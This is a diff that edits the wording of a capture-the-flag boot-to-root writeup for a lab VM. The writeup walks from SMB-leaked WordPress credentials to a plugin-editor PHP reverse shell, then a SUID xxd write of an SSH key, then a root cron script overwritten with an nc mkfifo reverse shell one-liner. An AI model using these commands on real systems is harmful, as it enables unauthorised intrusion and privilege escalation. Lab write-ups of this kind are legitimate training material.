@@ -2,7 +2,7 @@
 title: "B2R Monster Corporate Writeup"
 date: 2026-05-11T00:00:00+08:00
 draft: true
-summary: "A draft boot-to-root writeup for Monster Corporate, covering SMB enumeration, WordPress admin access, plugin RCE, lateral movement, and cron-based privilege escalation."
+summary: "A boot-to-root writeup for Monster Corporate, covering SMB enumeration, WordPress admin access, plugin RCE, lateral movement with xxd, and cron-based privilege escalation."
 tags: ["ctf", "web", "wordpress", "smb", "privilege-escalation"]
 categories: ["Writeups"]
 showToc: true
@@ -11,35 +11,35 @@ TocOpen: true
 
 ## Challenge description
 
-![monster-corporate-00.png](monster-corporate-00.png)
+![Monster Corporate challenge description](monster-corporate-00.png)
 
 ## Full attack chain summary
 
 ### Initial foothold
 
-gain wp admin credential on smb share → log in wp admin → rce wp plugin → gain shell as www-data
+Find WordPress admin credentials in an SMB share, log in to wp-admin, use plugin editing for RCE, and gain a shell as `www-data`.
 
 ### Lateral movement
 
-found SUID active on xxd binary → write boboyot ssh key → log in as boboyot 
+Find an active SUID bit on `xxd`, write an SSH key for `boboyot`, and log in as that user.
 
 ### Privilege escalation
 
-found cronjob running backup script → boboyot have write access to backup script → gain root shell
+Find a root cron job running a backup script, confirm `boboyot` can write to that script, and use it to gain a root shell.
 
 ## VM setup
 
-1. Open vm artifact in vmware(prefered) or virtualbox.
-2. Make sure network setting for attack-box and target machine using host-only.
+1. Open the VM artifact in VMware (preferred) or VirtualBox.
+2. Make sure the attack box and target machine both use a host-only network.
 
-![monster-corporate-00.png](monster-corporate-01.png)
+![Virtual machine network settings](monster-corporate-01.png)
 
-1. Power on the target machine
-2. Done. Start hacking using your kali.
+1. Power on the target machine.
+2. Start hacking from your Kali machine.
 
 ### Identify your attack-box IP and target IP
 
-Run ifconfig
+Run `ifconfig` to identify the attack-box interface.
 
 ```bash
 ifconfig
@@ -80,7 +80,7 @@ lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
 
 Attack-box IP (eth0): 192.168.106.128
 
-To identify target machine IP run host discovery scan
+To identify the target machine IP, run a host discovery scan.
 
 ```bash
 nmap 192.168.106.0/24 -sn 
@@ -103,7 +103,7 @@ Target machine IP: 192.168.106.129
 
 ## Service discovery
 
-run initial nmap scan to discover open port on target IP
+Run an initial Nmap scan to discover open ports on the target IP.
 
 ```bash
 nmap 192.168.106.129 -sV -oN initial.txt    
@@ -115,9 +115,9 @@ PORT    STATE SERVICE     VERSION
 445/tcp open  netbios-ssn Samba smbd 4
 ```
 
-We discover 4 open ports (22,80,139,445)
+We discover four open ports: 22, 80, 139, and 445.
 
-We can continue scanning using script to gain more information.
+Continue with default scripts to gather more service information.
 
 ```bash
 nmap 192.168.106.129 -sV -sC -oN second.txt            
@@ -144,13 +144,13 @@ Host script results:
 |_    Message signing enabled but not required
 ```
 
-From the scan we can conclude that this Linux machine run SSH,HTTP,SMB services and the website using Wordpress.
+From the scan, we can conclude that the Linux target is running SSH, HTTP, and SMB. The website is using WordPress.
 
-Always start from smb because sometimes golden treasure there.
+SMB is a good place to start because shared folders often contain useful information.
 
 ### Enumerating SMB
 
-We can list smb share if smb accepting guest login
+We can list SMB shares if the service accepts guest login.
 
 ```bash
 smbclient -L //192.168.106.129 -N
@@ -162,11 +162,11 @@ smbclient -L //192.168.106.129 -N
         IPC$            IPC       IPC Service (monster server (Samba, Ubuntu))
 ```
 
-The server accept guest login.
+The server accepts guest login.
 
-We found publicshare as non default share.
+We find `publicshare`, which is not a default share.
 
-Try connecting publicshare :
+Try connecting to `publicshare`:
 
 ```bash
 smbclient //192.168.106.129/publicshare -N
@@ -177,9 +177,9 @@ smb: \> ls
   note.txt                            N       98  Thu Mar  5 10:40:59 2026
 ```
 
-use ls command to list file in share
+Use `ls` to list files in the share.
 
-We found that note.txt in share. Download and read it.
+The share contains `note.txt`. Download and read it.
 
 ```bash
 smb: \> get note.txt
@@ -193,21 +193,21 @@ Here is your default password "KUasa#lemt4l". Please change it later.
 From: boboyot
 ```
 
-We found the credentials in smb but we don’t know where to use it.
+We found credentials in SMB, but we still need to find where to use them.
 
-Try enumerate another services.
+Next, enumerate the web service.
 
-### Enumerating Website
+### Enumerating website
 
-Open web browser to see what in the website
+Open the website in a browser.
 
-![monster-corporate-00.png](monster-corporate-02.png)
+![Monster Corporate WordPress homepage](monster-corporate-02.png)
 
 Just a normal blog, nothing interesting here.
 
-Since, we know the website using Wordpress we can directly access to wp-login.php
+Since we know the website is using WordPress, we can directly access `wp-login.php`.
 
-If you don’t know where is the endpoint, you can try fuzz the endpoint using tools, I’m using dirsearch
+If you do not know the endpoint, fuzz the site with a tool such as `dirsearch`.
 
 ```bash
 dirsearch -u http://192.168.106.129                                                     
@@ -267,11 +267,11 @@ Target: http://192.168.106.129/
 [00:32:07] 405 -   42B  - /xmlrpc.php
 ```
 
-Go to wp-login.php to test the credentials we got earlier
+Go to `wp-login.php` and test the credentials found earlier.
 
-![monster-corporate-00.png](monster-corporate-03.png)
+![WordPress login page](monster-corporate-03.png)
 
-From note.txt we found earlier
+From the `note.txt` file found earlier:
 
 ```bash
 Dear gempa,
@@ -281,60 +281,60 @@ Here is your default password "KUasa#lemt4l". Please change it later.
 From: boboyot
 ```
 
-Login using username “gempa” and password “KUasa#lemt4l”
+Log in with username `gempa` and password `KUasa#lemt4l`.
 
-![monster-corporate-00.png](monster-corporate-04.png)
+![Successful WordPress admin login](monster-corporate-04.png)
 
-Good news, we can log into wp-admin using the credentials.
+Good news: the credentials work for wp-admin.
 
-We need to know what permission does user “gempa” have right now
+Next, check what permissions the `gempa` user has.
 
-![monster-corporate-00.png](monster-corporate-05.png)
+![WordPress admin dashboard user permissions](monster-corporate-05.png)
 
-## Initial Foothold
+## Initial foothold
 
-Great, user “gempa” is administrator to this wordpress. To set initial foothold to system we can RCE using wordpress plugin.
+The `gempa` user is a WordPress administrator. To get the initial foothold, we can use plugin editing to achieve RCE.
 
-![monster-corporate-00.png](monster-corporate-06.png)
+![WordPress plugins page](monster-corporate-06.png)
 
-We have 2 non activate plugin, I’m using Hello Dolly Plugin.
+There are two inactive plugins. I use Hello Dolly.
 
-To initiate rce, activate the plugin first.
+Activate the plugin first.
 
-Then, click Tools → Plugin File Editor → Select Hello Dolly on right top → click select
+Then go to Tools, open Plugin File Editor, select Hello Dolly from the top-right dropdown, and click Select.
 
-![monster-corporate-00.png](monster-corporate-07.png)
+![Selecting Hello Dolly in the plugin file editor](monster-corporate-07.png)
 
-Then, I will use PHP Pentest Monkey Reverse Shell code to gain reverse shell. I’m using [revshells.com](http://revshells.com) website. 
+Then use a PHP reverse shell payload to get a shell. I generated the payload with [revshells.com](http://revshells.com).
 
-![monster-corporate-00.png](monster-corporate-08.png)
+![Generating a PHP reverse shell payload](monster-corporate-08.png)
 
 Set your attack-box IP address and port to listen.
 
-Copy the PHP code and paste on the hello.php editor and update the file
+Copy the PHP code, paste it into the `hello.php` editor, and update the file.
 
-![monster-corporate-00.png](monster-corporate-09.png)
+![Pasting the reverse shell payload into hello.php](monster-corporate-09.png)
 
-Before we execute the shell, we need to setup our listener base on port we enter earlier
+Before executing the shell, set up a listener on the port used in the payload.
 
-I’m using port 8888. Use netcat to listen on port 8888
+I use port 8888 with netcat.
 
 ```bash
 nc -lvnp 8888                               
 listening on [any] 8888 ...
 ```
 
-We are done setup the reverse shell, now we need to execute it.
+The listener is ready. Now execute the payload.
 
-Navigate to link [http://192.168.106.129/wp-content/plugins/hello.php](http://192.168.106.129/wp-content/plugins/hello.php) to activate the shell
+Navigate to [http://192.168.106.129/wp-content/plugins/hello.php](http://192.168.106.129/wp-content/plugins/hello.php) to trigger the shell.
 
-If you don’t know where is the link found, you can see dirsearch result earlier
+If you are unsure where this path came from, check the `dirsearch` result from earlier.
 
-![monster-corporate-00.png](monster-corporate-10.png)
+![Triggering the Hello Dolly payload path](monster-corporate-10.png)
 
-If the connection is hanging, 
+If the browser request hangs, check your listener.
 
-**CONGRATULATIONS,** you successfully receive reverse shell
+The listener receives a reverse shell.
 
 ```bash
 nc -lvnp 8888
@@ -352,27 +352,25 @@ www-data
 www-data@monster:/$ 
 ```
 
-You are having www-data shell now.
+We now have a shell as `www-data`.
 
-## Lateral Movement
+## Lateral movement
 
-Usually, as www-data doesn’t have special permission, we need to escalate.
+Usually, `www-data` does not have enough privileges, so we need to escalate.
 
-For post-exploitation, you can use linpeas, a comprehensive post-exploitation enumeration tool.
+For post-exploitation enumeration, you can use LinPEAS, but I will show the manual path first.
 
-But, i will show the manual first.
-
-As you enter the system, you need to gather as much data as possible to escalate as root.
+After entering the system, gather as much useful information as possible.
 
 Basic checklist:
 
-- another user in system
+- another system user
 - sudo -l
 - SUID
 - cronjob
 - any misconfigured binary
 
-Find another user on system
+Find other users on the system.
 
 ```bash
 cat /etc/passwd
@@ -383,7 +381,7 @@ boboyot:x:1000:1000:boboyot:/home/boboyot:/bin/bash
 
 ```
 
-look for user with shell, we found 2 user with /bin/bash shell or list /home directory
+Look for users with a shell, or list the `/home` directory.
 
 ```bash
 ls -la /home
@@ -393,16 +391,16 @@ drwxr-xr-x 20 root    root    4096 Mar  6 00:54 ..
 drwxr-x--- 15 boboyot boboyot 4096 Mar  5 14:53 boboyot
 ```
 
-Using sudo -l
+Check sudo permissions with `sudo -l`.
 
 ```bash
 sudo -l
 sudo-rs: Sorry, user www-data may not run sudo on monster.
 ```
 
-www-data have no sudo privilege.
+`www-data` has no sudo privileges.
 
-Find active SUID binary
+Find active SUID binaries.
 
 ```bash
 find / -type f -perm -04000 -ls 2>/dev/null
@@ -413,23 +411,23 @@ find / -type f -perm -04000 -ls 2>/dev/null
 
 ```
 
-We found interesting binary using SUID binary.
+We find an interesting SUID binary.
 
-From the result we can see common escalation vector, active SUID on xxd binary.
+The result shows an active SUID bit on `xxd`, which is a useful escalation vector.
 
-To abuse this LOLBIN, open [https://gtfobins.org](https://gtfobins.org/) to find interesting command.
+Open [GTFOBins](https://gtfobins.org/) to find useful commands for this binary.
 
-![monster-corporate-00.png](monster-corporate-11.png)
+![GTFOBins entry for xxd](monster-corporate-11.png)
 
-We only can write and read as user boboyot but not gaining shell
+With this path, we can read and write as `boboyot`, but it does not directly give us a shell.
 
-Remember port scan earlier, we have SSH service open. We can abuse SSH key to login as boboyot
+Remember from the port scan that SSH is open. We can write an SSH key and log in as `boboyot`.
 
-To write ssh public key copy and custom the command
+To write an SSH public key, adapt the command from GTFOBins.
 
-![monster-corporate-00.png](monster-corporate-12.png)
+![Using xxd to write a file as another user](monster-corporate-12.png)
 
-Generate a pair of SSH key in your attack-box
+Generate an SSH key pair on the attack box.
 
 ```bash
 ssh-keygen -t ED25519 -f boboyot  
@@ -454,7 +452,7 @@ The key's randomart image is:
 +----[SHA256]-----+
 ```
 
-Copy the public key generated
+Copy the generated public key.
 
 ```bash
 cat boboyot.pub
@@ -462,19 +460,19 @@ ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIA7xEqLulOEHxYpKn8JKZ9GyF2tkJ/woSOtphzd5kcFD
 
 ```
 
-In target machine
+On the target machine, use `xxd` to write the public key into `authorized_keys`.
 
-Custom the xxd command to write ssh authorized_keys in /home/boboyot/.ssh/authorized_keys
+Customize the command to write the SSH public key to `/home/boboyot/.ssh/authorized_keys`.
 
 ```bash
 echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIA7xEqLulOEHxYpKn8JKZ9GyF2tkJ/woSOtphzd5kcFD kali@kali\n" | xxd | xxd -r - /home/boboyot/.ssh/authorized_keys
 ```
 
-Run the command in target machine.
+Run the command on the target machine.
 
-After you successfully overwrite, you can ssh as boboyot
+After the overwrite succeeds, SSH as `boboyot`.
 
-Go your attack machine again, ssh as boboyot using private key
+Return to the attack machine and log in with the private key.
 
 ```bash
 ssh boboyot@192.168.106.129 -i boboyot
@@ -501,30 +499,30 @@ Welcome to Ubuntu 25.10 (GNU/Linux 6.17.0-14-generic x86_64)
 boboyot@monster:~$ 
 ```
 
-You are now boboyot in the machine
+We now have a shell as `boboyot`.
 
-## Privilege Escalation to Root
+## Privilege escalation to root
 
-From post-exploitation checklist before:
+Continue with the post-exploitation checklist:
 
-- [x]  another user in system
+- [x]  another system user
 - [ ]  sudo -l
 - [x]  SUID
 - [ ]  cronjob
 - [ ]  any misconfigured binary
 
-We have 3 list to check.
+There are still a few items to check.
 
-Start form sudo -l
+Start with `sudo -l`.
 
 ```bash
 sudo -l
 sudo-rs: Sorry, user boboyot may not run sudo on monster.
 ```
 
-boboyot don’t have sudo permission
+`boboyot` does not have sudo permissions.
 
-Proceed to check cronjob
+Proceed to check cron jobs.
 
 ```bash
 cat /etc/crontab
@@ -554,43 +552,43 @@ SHELL=/bin/sh
 * * * * * root /opt/backup.sh
 ```
 
-Gotcha, we found root cronjob here
+We find a root cron job.
 
-Let’s analyse [backup.sh](http://backup.sh)
+Analyze `/opt/backup.sh`.
 
 ```bash
 ls -la /opt/backup.sh
--rwxr**w**---- 1 root boboyot 95 Mar  6 01:03 /opt/backup.sh
+-rwxrw---- 1 root boboyot 95 Mar  6 01:03 /opt/backup.sh
 
 cat /opt/backup.sh
 rm /opt/backup/*.tar.gz;tar -czf /opt/backup/boboyot_home_$(date +%Y%m%d).tar.gz /home/boboyot
 ```
 
-It is just a normal backup script, where the script function to backup boboyot home directory.
+This is a normal backup script for the `boboyot` home directory.
 
-From information we got, boboyot group can write into [backup.sh](http://backup.sh)
+From the file permissions, the `boboyot` group can write to `/opt/backup.sh`.
 
-That mean we can modify [backup.sh](http://backup.sh) to spawn root shell
+That means we can modify the script and use the root cron job to spawn a root shell.
 
-There are several way to spawn root shell but 
+There are several ways to spawn a root shell.
 
-I prefer use reverse shell since the script always executed every minutes
+I prefer using a reverse shell because the script runs every minute.
 
-to gain persistence access to system.
+This gives us a reliable way to catch the root shell from the attack box.
 
-Again visit revshells.com
+Generate another payload with [revshells.com](http://revshells.com).
 
-![monster-corporate-00.png](monster-corporate-13.png)
+![Generating an nc mkfifo reverse shell payload](monster-corporate-13.png)
 
-I’m using nc mkfifo reverse shell. This time I’m using port 9999. Copy the payload.
+I use the `nc mkfifo` reverse shell payload on port 9999.
 
-Overwrite backup.sh
+Overwrite `/opt/backup.sh` with the payload.
 
 ```bash
 echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 192.168.106.128 9999 >/tmp/f' > /opt/backup.sh
 ```
 
-Don’t forget to set up the listener
+Set up the listener.
 
 ```bash
 nc -lvnp 9999               
@@ -598,7 +596,7 @@ listening on [any] 9999 ...
 
 ```
 
-wait for backup script executed
+Wait for the backup script to execute.
 
 ```bash
 nc -lvnp 9999               
@@ -609,10 +607,10 @@ bash: no job control in this shell
 root@monster:~# 
 ```
 
-CONGRATULATIONS, YOU ARE ROOT🥳
+We now have a root shell.
 
-Claim your flag in discord ticket. Bye bye
+Claim your flag in the Discord ticket. Bye bye.
 
-Thank you for reading
+Thank you for reading.
 
 **AUTHOR: 𝓚𝓘𝓝𝓖**
